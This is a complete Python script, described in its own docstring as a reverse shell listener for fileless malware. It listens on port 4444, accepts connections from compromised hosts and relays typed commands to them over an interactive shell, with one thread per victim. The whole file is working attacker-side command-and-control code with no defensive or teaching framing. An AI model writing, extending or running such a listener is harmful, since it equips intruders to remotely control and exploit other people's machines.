#!/usr/bin/env python3
"""
Reverse Shell Listener for Fileless Malware
"""

import socket
import threading
import sys

def handle_shell(client_socket, address):
    print(f"\n[✅] SHELL CONNECTED from {address}")
    client_socket.settimeout(10.0)
    
    try:
        while True:
            # Send prompt
            client_socket.send(b"$ ")
            
            # Receive output
            output = b""
            while True:
                try:
                    chunk = client_socket.recv(4096)
                    if chunk:
                        output += chunk
                    else:
                        break
                except socket.timeout:
                    break
            
            if output:
                print(output.decode('utf-8', errors='ignore'), end='')
            
            # Get command
            try:
                cmd = input().strip()
                if cmd.lower() == 'exit':
                    break
                client_socket.send((cmd + "\n").encode())
            except (EOFError, KeyboardInterrupt):
                break
                
    except Exception as e:
        print(f"\n[!] Shell disconnected: {e}")
    finally:
        client_socket.close()

def start_listener(port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    
    print(f"[+] Listening for reverse shells on port {port}")
    
    while True:
        try:
            client_socket, address = server.accept()
            thread = threading.Thread(target=handle_shell, args=(client_socket, address))
            thread.daemon = True
            thread.start()
        except KeyboardInterrupt:
            print("\n[!] Shutting down...")
            break

if __name__ == "__main__":
    start_listener(4444)